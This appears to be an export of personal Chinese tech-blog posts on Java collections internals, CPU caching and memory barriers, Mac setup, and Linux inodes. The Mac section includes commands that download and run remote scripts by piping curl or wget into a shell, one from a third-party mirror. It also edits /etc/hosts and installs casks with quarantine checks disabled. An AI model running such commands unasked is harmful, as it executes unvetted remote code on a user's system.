<p>详情请查看：<a href="https://coolshell.cn/articles/9606.html">https://coolshell.cn/articles/9606.html</a></p>
<h3 id="Hash-Collision-Dos问题"><a href="#Hash-Collision-Dos问题" class="headerlink" title="Hash Collision Dos问题"></a>Hash Collision Dos问题</h3><p>这个安全弱点利用了各语言的Hash算法的“非随机性”可以制造出N多的value不一样，但是key一样数据，然后Hash表成为一张单向链表，而导致整个网站或是程序的运行性能以级数下降（可以很轻松的CPU升到100%）</p>
<h3 id="能否使用任何类作为-Map-的-key？"><a href="#能否使用任何类作为-Map-的-key？" class="headerlink" title="能否使用任何类作为 Map 的 key？"></a>能否使用任何类作为 Map 的 key？</h3><p>可以使用任何类作为 Map 的 key，然而在使用之前，需要考虑以下几点：  如果类重写了 equals() 方法，也应该重写 hashCode() 方法。类的所有实例需要遵循与 equals() 和 hashCode() 相关的规则。</p>
<p>如果一个类没有使用 equals()，不应该在 hashCode() 中使用它。</p>
<p>用户自定义 Key 类佳实践是使之为不可变的，这样 hashCode() 值可以被缓存起来，拥有更好的性能。不可变的类也可以确保 hashCode() 和 equals() 在未来不会改变，这样就会解决与可变相关的问题了。</p>
<h3 id="在使用-HashMap-的时候，用-String-做-key-有什么好处？"><a href="#在使用-HashMap-的时候，用-String-做-key-有什么好处？" class="headerlink" title="在使用 HashMap 的时候，用 String 做 key 有什么好处？"></a>在使用 HashMap 的时候，用 String 做 key 有什么好处？</h3><p>HashMap 内部实现是通过 key 的 hashcode 来确定 value 的存储位置，因为字符串是不可变的，所以当创建字符串时，它的 hashcode 被缓存下来，不需要再次计算，所以相比于其他对象更快。</p>
<p>String、Integer等包装类的特性能够保证Hash值的不可更改性和计算准确性，能够有效的减少Hash碰撞的几率</p>
<ol>
<li>都是final类型，即不可变性，保证key的不可更改性，不会存在获取 hash值不同的情况.</li>
</ol>
<p>内部已重写了equals()、hashCode()等方法，遵守了HashMap内部的规范（不清楚可以去上面看看putValue的过程），不容易出现Hash值计算错误的情况</p>
<h3 id="如果使用Object作为HashMap的Key，应该怎么办呢？"><a href="#如果使用Object作为HashMap的Key，应该怎么办呢？" class="headerlink" title="如果使用Object作为HashMap的Key，应该怎么办呢？"></a>如果使用Object作为HashMap的Key，应该怎么办呢？</h3><p>答：重写hashCode()和equals()方法</p>
<ol>
<li><p>重写hashCode()是因为需要计算存储数据的存储位置，需要注意不要试图从散列码计算中排除掉一个对象的关键部分来提高性能，这样虽然能更快但可能会导致更多的Hash碰撞；</p>
</li>
<li><p>重写equals()方法，需要遵守自反性、对称性、传递性、一致性以及对于任何非null的引用值x，x.equals(null)必须返回false的这几个特性，目的是为了保证key在哈希表中的唯一性。</p>
</li>
</ol>
<h3 id="HashMap为什么不直接使用hashCode-处理后的哈希值直接作为table的下标？"><a href="#HashMap为什么不直接使用hashCode-处理后的哈希值直接作为table的下标？" class="headerlink" title="HashMap为什么不直接使用hashCode()处理后的哈希值直接作为table的下标？"></a>HashMap为什么不直接使用hashCode()处理后的哈希值直接作为table的下标？</h3><p>答：hashCode()方法返回的是int整数类型，其范围为-(2 ^ 31)<del>(2 ^ 31 - 1)，约有40亿个映射空间，而HashMap的容量范围是在16（初始化默认值）</del>2 ^ 30，HashMap通常情况下是取不到大值的，并且设备上也难以提供这么多的存储空间，从而导致通过hashCode()计算出的哈希值可能不在数组大小范围内，进而无法匹配存储位置；</p>
<ol>
<li><p>HashMap自己实现了自己的hash()方法，通过两次扰动使得它自己的哈希值高低位自行进行异或运算，降低哈希碰撞概率也使得数据分布更平均；</p>
</li>
<li><p>在保证数组长度为2的幂次方的时候，使用hash()运算之后的值与运算（&amp;）（数组长度 - 1）来获取数组下标的方式进行存储，这样一来是比取余操作更加有效率，二来也是因为只有当数组长度为2的幂次方时，h&amp;(length-1)才等价于h%length，三来解决了“哈希值与数组大小范围不匹配”的问题。</p>
</li>
</ol>
<h3 id="HashMap-putVal"><a href="#HashMap-putVal" class="headerlink" title="HashMap putVal"></a>HashMap putVal</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848502.png" alt="image-20210502162723163"></p>
<h3 id="解决hash冲突问题"><a href="#解决hash冲突问题" class="headerlink" title="解决hash冲突问题"></a>解决hash冲突问题</h3><ul>
<li>拉链法；</li>
<li>使用两次扰动函数（hash函数）；</li>
<li>引入红黑树。</li>
</ul>
<p>如果只是单纯的用hashCode取余来获取对应的bucket这将会大大增加哈希碰撞的概率，并且最坏情况下还会将HashMap变成一个单链表，所以还需要对hashCode作一定的优化 hash()函数。</p>
<p>上面提到的问题，主要是因为如果使用hashCode取余，那么相当于参与运算的只有hashCode的低位，高位是没有起到任何作用的，所以我们的思路就是让 hashCode取值出的高位也参与运算，进一步降低hash碰撞的概率，使得数据分布更平均，这样的操作称为扰动，在JDK 1.8中的hash()函数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1	static final int hash(Object key) &#123;</span><br><span class="line">2	int h;</span><br><span class="line">3	return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);// 与自己右移16位进行异或运算（高低位异或）</span><br><span class="line">4	&#125;</span><br></pre></td></tr></table></figure>

<p>这比在JDK 1.7中，更为简洁，相比在1.7中的4次位运算，5次异或运算（9次扰动），在1.8中，只进行了1次位运算和1次异或运算（2次扰动）；</p>
<h2 id="ConcurrentHashMap"><a href="#ConcurrentHashMap" class="headerlink" title="ConcurrentHashMap"></a>ConcurrentHashMap</h2><ul>
<li><p>Jdk1.7 分段数组+链表，jdk1.8 数组+链表&#x2F;红黑树；</p>
</li>
<li><p>Jdk1.7 采用分段锁，每把锁只锁一部分数据；</p>
</li>
<li><p>Jdk 1.8 采用 CAS 和 synchronized 来保证并发安全；</p>
</li>
<li><p>synchronized 只锁定当前链表或红黑树的首节点，这样只要 hash 不冲突，就不会产生并发，效率又提升 N 倍；</p>
</li>
<li><p>ConcurrentHashMap 的初始化是通过自旋和 CAS 操作完成的；</p>
</li>
<li><p>建值对不能为空；</p>
</li>
<li><p>建议根据需求给初始容量，以防后期扩容很耗时，给32的话实际是64。</p>
</li>
</ul>
<p>sizeCtl:</p>
<ol>
<li>-1 说明正在初始化</li>
<li>-N 说明有N-1个线程正在进行扩容</li>
<li>表示 table 初始化大小，如果 table 没有初始化</li>
<li>表示 table 容量，如果 table已经初始化。</li>
</ol>
<p>put源码:</p>
<ol>
<li>根据 key 计算出 hashcode 。</li>
<li>判断是否需要进行初始化。</li>
<li>即为当前 key 定位出的 Node，如果为空表示当前位置可以写入数据，利用 CAS 尝试写入，失败则自旋保证成功。</li>
<li>如果当前位置的 <code>hashcode == MOVED == -1</code>，则需要进行扩容。</li>
<li>如果都不满足，则利用 synchronized 锁写入数据。</li>
<li>如果数量大于 <code>TREEIFY_THRESHOLD</code> 则要转换为红黑树。</li>
</ol>
<p>get源码:</p>
<ol>
<li>根据 hash 值计算位置。</li>
<li>查找到指定位置，如果头节点就是要找的，直接返回它的 value。</li>
<li>如果头节点 hash 值小于 0 ，说明正在扩容或者是红黑树，查找之。</li>
<li>如果是链表，遍历查找之。</li>
</ol>
<p>插入元素过程：</p>
<p>如果相应位置的Node还没有初始化，则调用CAS插入相应的数据；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1	else if ((f = tabAt(tab， i = (n ‐ 1) &amp; hash)) == null) &#123;</span><br><span class="line">2	if (casTabAt(tab， i， null， new Node&lt;K，V&gt;(hash， key， value， null)))</span><br><span class="line">3	break; // no lock when adding to empty bin</span><br><span class="line">4	&#125;</span><br></pre></td></tr></table></figure>

<p>如果相应位置的Node不为空，且当前该节点不处于移动状态，则对该节点加synchronized锁，如果该节点的hash不小于0，则遍历链表更新节点或插入新节点；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 if (fh &gt;= 0) &#123; </span><br><span class="line">2 binCount = 1;</span><br><span class="line">3	for (Node&lt;K，V&gt; e = f;; ++binCount) &#123;</span><br><span class="line">4	K ek;</span><br><span class="line">5	if (e.hash == hash &amp;&amp;</span><br><span class="line">6	((ek = e.key) == key ||</span><br><span class="line">7	(ek != null &amp;&amp; key.equals(ek)))) &#123;</span><br><span class="line">8	oldVal = e.val;</span><br><span class="line">9	if (!onlyIfAbsent)</span><br><span class="line">10	e.val = value;</span><br><span class="line">11	break;</span><br><span class="line">12	&#125;</span><br><span class="line">13	Node&lt;K，V&gt; pred = e;</span><br><span class="line">14	if ((e = e.next) == null) &#123;</span><br><span class="line">15	pred.next = new Node&lt;K，V&gt;(hash， key， value， null);</span><br><span class="line">16	break;</span><br><span class="line">17	&#125;</span><br><span class="line">18	&#125;</span><br><span class="line">19	&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>如果该节点是TreeBin类型的节点，说明是红黑树结构，则通过 putTreeVal方法往红黑树中插入节点；如果binCount不为0，说明put操作对数据产生了影响，如果当前链表的个数达到8个，则通过treeifyBin方法转化为红黑树，如果oldVal不为空，说明是一次更新操作，没有对元素个数产生影响，则直接返回旧值；</p>
</li>
<li><p>如果插入的是一个新节点，则执行addCount()方法尝试更新元素个数 baseCount；</p>
</li>
</ol>
<h2 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h2><ul>
<li>默认11，扩容2n+ 1；</li>
<li>线程安全，所有方法都用sychronized修饰；</li>
<li>不允许null键和值；</li>
<li>没有转红黑树的机制；</li>
<li>如使用 put 添加元素，另一个线程不能使用 put 添加元素，也不能使用 get。</li>
</ul>
<h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><ul>
<li>用于获取配置文件值，key-value形式。</li>
</ul>
<h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><ul>
<li>相比于HashMap来说 TreeMap 主要多了对集合中的元素根据键排序的能力以及对集合内元素的搜索的能力。</li>
</ul>
<h2 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848696.jpg" alt="LinkedHashMap源码详细分析（JDK1.8）_"></p>
<h2 id="如何决定使用-HashMap-还是TreeMap？"><a href="#如何决定使用-HashMap-还是TreeMap？" class="headerlink" title="如何决定使用 HashMap 还是TreeMap？"></a>如何决定使用 HashMap 还是TreeMap？</h2><p>对于在Map中插入、删除和定位元素这类操作，HashMap是好的选择。然而，假如你需要对一个有序的key集合进行遍历，TreeMap是更好的选择。基于你的collection的大小，也许向HashMap中添加元素会更快，将map换为TreeMap进行有序key的遍历</p>
<h2 id="Array-和-ArrayList-有何区别？"><a href="#Array-和-ArrayList-有何区别？" class="headerlink" title="Array 和 ArrayList 有何区别？"></a>Array 和 ArrayList 有何区别？</h2><ul>
<li>Array 可以存储基本数据类型和对象，ArrayList 只能存储对象；</li>
<li>Array 是指定固定大小的，而 ArrayList 大小是自动扩展的；</li>
<li>Array 内置方法没有 ArrayList 多，比如 addAll、removeAll、iteration 等方法只有 ArrayList 有；</li>
</ul>
<p>对于基本类型数据，集合使用自动装箱来减少编码工作量。但是，当处理固定大小的基本数据类型的时候，这种方式相对比较慢。</p>
<h2 id="如何实现-Array-和-List-之间的转换？"><a href="#如何实现-Array-和-List-之间的转换？" class="headerlink" title="如何实现 Array 和 List 之间的转换？"></a>如何实现 Array 和 List 之间的转换？</h2><ul>
<li>Array 转 List： Arrays. asList(array) ；</li>
<li>List 转 Array：List 的 toArray() 方法。</li>
</ul>
<h2 id="comparable-和-comparator的区别？"><a href="#comparable-和-comparator的区别？" class="headerlink" title="comparable 和 comparator的区别？"></a>comparable 和 comparator的区别？</h2><ul>
<li>comparable接口是出自java.lang包，它有一个 compareTo(Object obj)方法用来排序</li>
<li>comparator接口是出自 java.util 包，它有一个compare(Object obj1， Object obj2)方法用来排序</li>
</ul>
<p>一般需要对一个集合使用自定义排序时，就要重写compareTo方法或 compare方法，当需要对某一个集合实现两种排序方式，比如一个song对象中的歌名和歌手名分别采用一种排序方法的话，可以重写compareTo方法和使用自制的Comparator方法或者以两个Comparator来实现歌名排序和歌星名排序，第二种代表我们只能使用两个参数版的Collections.sort()。</p>
<h2 id="Collection-和-Collections-有什么区别？"><a href="#Collection-和-Collections-有什么区别？" class="headerlink" title="Collection 和 Collections 有什么区别？"></a>Collection 和 Collections 有什么区别？</h2><ul>
<li>java.util.Collection 是一个集合接口（集合类的一个顶级接口）。它提供了对集合对象进行基本操作的通用接口方法。Collection接口在Java 类库中有很多具体的实现。Collection接口的意义是为各种具体的集合提供了 大化的统一操作方式，其直接继承接口有List与Set。</li>
<li>Collections则是集合类的一个工具类&#x2F;帮助类，其中提供了一系列静态方法，用于对集合中元素进行排序、搜索以及线程安全等各种操作。</li>
</ul>
<h2 id="TreeMap-和-TreeSet-在排序时如何比较元素？-Collections-工具类中的-sort-方法如何比较元素？"><a href="#TreeMap-和-TreeSet-在排序时如何比较元素？-Collections-工具类中的-sort-方法如何比较元素？" class="headerlink" title="TreeMap 和 TreeSet 在排序时如何比较元素？ Collections 工具类中的 sort()方法如何比较元素？"></a>TreeMap 和 TreeSet 在排序时如何比较元素？ Collections 工具类中的 sort()方法如何比较元素？</h2><p>TreeSet 要求存放的对象所属的类必须实现 Comparable 接口，该接口提供了比较元素的 compareTo()方法，当插入元素时会回调该方法比较元素的大小。</p>
<p>TreeMap 要求存放的键值对映射的键必须实现 Comparable 接口从而根据键对元素进行排序。</p>
<p>Collections 工具类的 sort 方法有两种重载的形式，</p>
<p>第一种要求传入的待排序容器中存放的对象比较实现 Comparable 接口以实现元素的比较；</p>
<p>第二种不强制性的要求容器中的元素必须可比较，但是要求传入第二个参数，参数是Comparator 接口的子类型（需要重写 compare 方法实现元素的比较），相当于一个临时定义的排序规则，其实就是通过接口注入比较元素大小的算法，也是对回调模式的应用（Java 中对函数式编程的支持）。</p>
<h1 id="计算机组成原理"><a href="#计算机组成原理" class="headerlink" title="计算机组成原理"></a>计算机组成原理</h1><p>多核cpu性能好， 但是成本高; 多cpu成本小，便宜，但是性能相对较差;</p>
<p>超线程， 一个核里面有两组寄存器，pc，但只有一个ALU，两个线程切换不需要保存现场，速度很快; 4核8线程是指有4个核，每个核有两组寄存器和pc;</p>
<p>一个cacheline 64字节， 从内存一次中一次读一个cacheline， 先读到L3cache， 然后L2cache， 然后L1cache;</p>
<p>图中一个cpu里面两个核， 一般L3Cache1只在一个cpu里面;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848138.png" alt="image-20210423105857316"></p>
<p>假设对x和y使用了volatile，那么缓存需要一致，保持可见性，使用缓存一致性协议</p>
<p>线程1只用x， 而线程2只用y，使用有缓存一致性协议，x改了，线程二也得重新读缓存行，其实没有必要，它只用y， 可以缓存行对齐的方式解决， 浪费几个空间，x后面用无用数据占满;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848127.png" alt="image-20210423110113455"></p>
<p>MSI MESI(intel) MOSI Synapse Firefly Dragon 都是缓存一致性协议，只是用在不同的cpu上</p>
<p>硬件上使用缓存锁;</p>
<p>如果其中一个缓存行改了，它会写回主存，它还会通过总线，告诉另一个缓存行你这个是invaild，然后这个缓存行回去缓存中读过; </p>
<p>MESI， 总线锁是volatile的具体实现;</p>
<p>volatile在jvm级别是通过内存屏障来防止乱序执行;到c++这个级别是通过lock执行来保证;</p>
<h2 id="DCL-double-checked-locking-单例模式需要加volatile吗"><a href="#DCL-double-checked-locking-单例模式需要加volatile吗" class="headerlink" title="DCL (double-checked locking)单例模式需要加volatile吗"></a>DCL (double-checked locking)单例模式需要加volatile吗</h2><p>对象创建分为3步， 分配内存(此时的变量都只有默认值)，初始化，然后引用指向这块内存</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848148.png" alt="image-20210423114558613"></p>
<p>假设第一个线程初始化的时候发生指令重拍，指向了半初始化对象， 此时还没有执行构造方法; </p>
<p>然后第二个线程来了， 先判断t是否为空， 不空就直接用，使用了半初始化的对象，运行一百万次都难得出现一次，没有并发一定不会出现.</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848159.png" alt="image-20210423114754951"></p>
<p>cpu指令重排: 假设指令一去读数据了，然后指令二不依赖于指令一，cpu就会接着执行指令二</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848295.png" alt="image-20210423111942569"></p>
<p>wcbuffer (write combining)合并写buffer， 就4个字节，</p>
<p>为了提高效率，cpu在写入L1时，同时用wc写入L2， 由于ALU速度太快，所以在写入L1的同时，写入一份WCBuffer ， 满了之后， 再直接更新到L2</p>
<h2 id="cpu层面如何禁止重排序"><a href="#cpu层面如何禁止重排序" class="headerlink" title="cpu层面如何禁止重排序?"></a>cpu层面如何禁止重排序?</h2><p>内存屏障， 对某部分内存做操作时前后添加屏障， 屏障前后的操作不可以乱序执行</p>
<h2 id="禁止乱序"><a href="#禁止乱序" class="headerlink" title="禁止乱序"></a>禁止乱序</h2><p>cpu层面: Intel -》原语(mfence（混合）， lfence（Load）， sfence（Store）)或者锁总线</p>
<p>JVM层面: 8个happens-before原则， 4个内存屏障(ll， ls， sl， ss)</p>
<p>as if serial: 不管硬件什么执行顺序， 单线程执行的结果不变， 看上去像是serial</p>
<p>hotspot就使用了lock(汇编指令)指令来执行</p>
]]></content>
      <categories>
        <category>base</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac 深度使用技巧</title>
    <url>/2022/02/20/Mac-%E6%B7%B1%E5%BA%A6%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h1 id="Mac-深度使用技巧"><a href="#Mac-深度使用技巧" class="headerlink" title="Mac 深度使用技巧"></a>Mac 深度使用技巧</h1><h2 id="首次激活"><a href="#首次激活" class="headerlink" title="首次激活"></a>首次激活</h2><h3 id="系统设置"><a href="#系统设置" class="headerlink" title="系统设置"></a>系统设置</h3><ul>
<li>设置轻点来点按（跟踪速度7格）</li>
<li>设置三指拖移</li>
<li>程序坞移至左边</li>
<li>开启远程管理、远程登陆和文件共享</li>
</ul>
<h3 id="安装Homebrew"><a href="#安装Homebrew" class="headerlink" title="安装Homebrew"></a>安装Homebrew</h3><p><a href="https://brew.sh/">https://brew.sh/</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">需要科学上网</span></span><br><span class="line">echo &quot;185.199.108.133 raw.githubusercontent.com</span><br><span class="line">140.82.113.3    github.com</span><br><span class="line">199.232.69.194  github.global.ssl.fastly.net&quot; &gt;&gt; /etc/hosts</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载</span></span><br><span class="line">/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/uninstall.sh)&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置镜像源</span></span><br><span class="line">git -C &quot;$(brew --repo)&quot; remote set-url origin https://mirrors.ustc.edu.cn/brew.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/core)&quot; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git</span><br><span class="line"></span><br><span class="line">brew update</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">恢复镜像源</span></span><br><span class="line">git -C &quot;$(brew --repo)&quot; remote set-url origin https://github.com/Homebrew/brew.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/core)&quot; remote set-url origin https://github.com/Homebrew/homebrew-core.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://github.com/Homebrew/homebrew-cask.git</span><br><span class="line"></span><br><span class="line">brew update</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">无需科学上网</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装 选清华源</span></span><br><span class="line">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">卸载</span></span><br><span class="line">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/HomebrewUninstall.sh)&quot;</span><br></pre></td></tr></table></figure>

<h3 id="自动化脚本安装软件"><a href="#自动化脚本安装软件" class="headerlink" title="自动化脚本安装软件"></a>自动化脚本安装软件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">bat 是一款可用在 Linux 命令行显示文件内容的工具，bat 命令功能跟常用命令 <span class="built_in">cat</span> 类似。只是 bat 功能上更加强大一些，bat 在 <span class="built_in">cat</span> 命令的基础上加入了行号显示、代码高亮和 Git 集成。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">fzf是一个通用的命令行模糊查找器, 通过输入模糊的关键词就可以定位文件或文件夹。结合其他工具(比如rg)可以完成非常多的工作，在工作中可以大幅提高你的工作效率。fzf可以用于文件、命令历史记录、进程、主机名、书签、git提交等。</span></span><br><span class="line"></span><br><span class="line">brew install bat docker-compose fzf git maven nvm wget telnet;</span><br><span class="line"></span><br><span class="line">brew install cask --no-quarantine another-redis-desktop-manager baidunetdisk dingtalk docker drawio google-chrome hiddenbar iina iterm2 jetbrains-toolbox visual-studio-code lepton maczip mounty oracle-jdk golang postman qiyimedia snipaste stats sunloginclient tencent-meeting vmware-fusion wechat qq neteasemusic discord bitwarden typora</span><br></pre></td></tr></table></figure>

<h2 id="软件推荐"><a href="#软件推荐" class="headerlink" title="软件推荐"></a>软件推荐</h2><h3 id="必装软件"><a href="#必装软件" class="headerlink" title="必装软件"></a>必装软件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alfred iterm2 iina idea typora stats ishot maczip transmit magnet google hidden bar yoink</span><br></pre></td></tr></table></figure>



<ul>
<li><a href="https://www.macwk.com/">https://www.macwk.com/</a></li>
<li>Redis Desktop manager redis 客户端工具</li>
<li>Alfred 4 搜索</li>
<li>Hidden Bar 菜单栏图标显示隐藏</li>
<li>IINA 视频播放器</li>
<li>Iterm 2 终端 </li>
<li>Jetbarins ToolBox  开发工具管理，可以用来安装开发工具</li>
<li>Mac zip  解压缩工具 </li>
<li>Mountry NTFS读写工具</li>
<li>Ishot截图软件</li>
<li>stats 用来展示系统状态</li>
<li>Path Finder Finder 辅助工具</li>
<li>Screen Flow 屏幕录制工具</li>
<li>Transmit  SFTP 文件服务器</li>
<li>Dowine 4  网站视频下载工具</li>
<li>Motrix      多线程下载工具</li>
<li>Rectangle 分屏工具</li>
<li>yoink    临时仓库</li>
<li>Terminus 终端工具</li>
<li>one switch 小工具(隐藏桌面,屏幕常亮)</li>
<li>柠檬清理 </li>
<li>Dev-sidecar(gitee) 开发者边车，github打不开，github 加速, git clone加速，google CDN加速，Stack Overflow加速</li>
<li>lepton 代码片段管理工具</li>
<li>Typora</li>
<li>discord</li>
<li>bitwarden</li>
<li>花生壳</li>
<li>网易有道词典</li>
<li>向日葵</li>
<li>cheatsheet</li>
<li>clashx</li>
<li>dash</li>
<li>discord</li>
<li>docker</li>
<li>draw.io</li>
<li>goland</li>
<li>idea</li>
<li>webstorm</li>
<li>Pycharm</li>
<li>google</li>
<li>magnet</li>
<li>office</li>
<li>microsoft remote desktop</li>
<li>Mongoldb compass</li>
<li>Navicat premium</li>
<li>Offset explorer 2</li>
<li>Pdf reader pro</li>
<li>picgo</li>
<li>postman</li>
<li>Regex101</li>
<li>teamviewer</li>
<li>todesk</li>
<li>transmit</li>
<li>visual studio code</li>
<li>Switchhost</li>
</ul>
<h2 id="软件技巧"><a href="#软件技巧" class="headerlink" title="软件技巧"></a>软件技巧</h2><h3 id="Iterm2"><a href="#Iterm2" class="headerlink" title="Iterm2"></a>Iterm2</h3><h4 id="配置云端存储"><a href="#配置云端存储" class="headerlink" title="配置云端存储"></a>配置云端存储</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202212337013.png" alt="image-20220221233708935"></p>
<h4 id="安装-oh-my-zsh"><a href="#安装-oh-my-zsh" class="headerlink" title="安装 oh-my-zsh"></a>安装 oh-my-zsh</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</span><br><span class="line"></span><br><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改主题</span></span><br><span class="line">ZSH_THEME=&quot;robbyrussell&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重载配置生效</span></span><br><span class="line">exec zsh</span><br></pre></td></tr></table></figure>

<ul>
<li>设置背景</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202202239513.png" alt="image-20211222140203521"></p>
<ul>
<li>Autosuggestion 命令自动补全</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1.下载插件</span></span><br><span class="line">git clone git://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/plugins/zsh-autosuggestions</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2.配置</span> </span><br><span class="line">plugins=(git zsh-autosuggestions)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3.加载配置</span></span><br><span class="line">exec zsh</span><br></pre></td></tr></table></figure>

<h3 id="Alfred"><a href="#Alfred" class="headerlink" title="Alfred"></a>Alfred</h3><h4 id="配置云端存储配置"><a href="#配置云端存储配置" class="headerlink" title="配置云端存储配置"></a>配置云端存储配置</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202202239528.png" alt="image-20211222141241785"></p>
<h3 id="短信同步配置"><a href="#短信同步配置" class="headerlink" title="短信同步配置"></a>短信同步配置</h3><p>配置苹果手机和苹果电脑短信同步</p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
      <tags>
        <tag>mac</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux</title>
    <url>/2022/03/01/Linux/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Linux-文件系统"><a href="#Linux-文件系统" class="headerlink" title="Linux 文件系统"></a>Linux 文件系统</h2><h3 id="inode-介绍"><a href="#inode-介绍" class="headerlink" title="inode 介绍"></a>inode 介绍</h3><p><strong>inode 是 linux&#x2F;unix 文件系统的基础。</strong></p>
<p>硬盘的最小存储单位是扇区（Sector），块（block）由多个扇区组成。文件数据存储在块中。块的最常见的大小是 4kb，约为 8 个连续的扇区组成（每个扇区存储 512 字节）。一个文件可能会占用多个 block，但是一个块只能存放一个文件。</p>
<p>虽然，将文件存储在了块（block）中，但是还需要一个空间来存储文件的 元信息 metadata ：如某个文件被分成几块、每一块在的地址、文件拥有者，创建时间，权限，大小等。这种存储文件元信息的区域就叫 inode，译为索引节点：i（index）+node。每个文件都有一个 inode，存储文件的元信息。</p>
<p>可以使用 stat 命令可以查看文件的 inode 信息。每个 inode 都有一个号码，Linux&#x2F;Unix 操作系统不使用文件名来区分文件，而是使用 inode 号码区分不同的文件。</p>
<p>简单来说：inode就是用来维护某个文件被分成几块、每一块在的地址、文件拥有者，创建时间，权限，大小等信息。</p>
<p>简单总结一下：</p>
<ul>
<li>inode ：记录文件的属性信息，可以使用 stat 命令查看 inode 信息。</li>
<li>block ：实际文件的内容，如果一个文件大于一个块时候，那么将占用多个 block，但是一个块只能存放一个文件。（因为数据是由 inode 指向的，如果有两个文件的数据存放在同一个块中，就会乱套了）</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848586.png" alt="image-20210502150535276"></p>
<h3 id="Linux-文件类型"><a href="#Linux-文件类型" class="headerlink" title="Linux 文件类型"></a>Linux 文件类型</h3><p>Linux 支持很多文件类型，其中非常重要的文件类型有：普通文件，目录文件，链接文件，设备文件，管道文件，Socket 套接字文件等。</p>
<ul>
<li>普通文件（-） ： 用于存储信息和数据， Linux用户可以根据访问权限对普通文件进行查看、更改和删除。比如：图片、声音、PDF、text、视频、源代码等等。</li>
<li>目录文件（d，directory file） ：目录也是文件的一种，用于表示和管理系统中的文件，目录文件中包含一些文件名和子目录名。打开目录事实上就是打开目录文件。</li>
<li>符号链接文件（l，symbolic link） ：保留了指向文件的地址而不是文件本身。</li>
<li>字符设备（c，char） ：用来访问字符设备比如硬盘。</li>
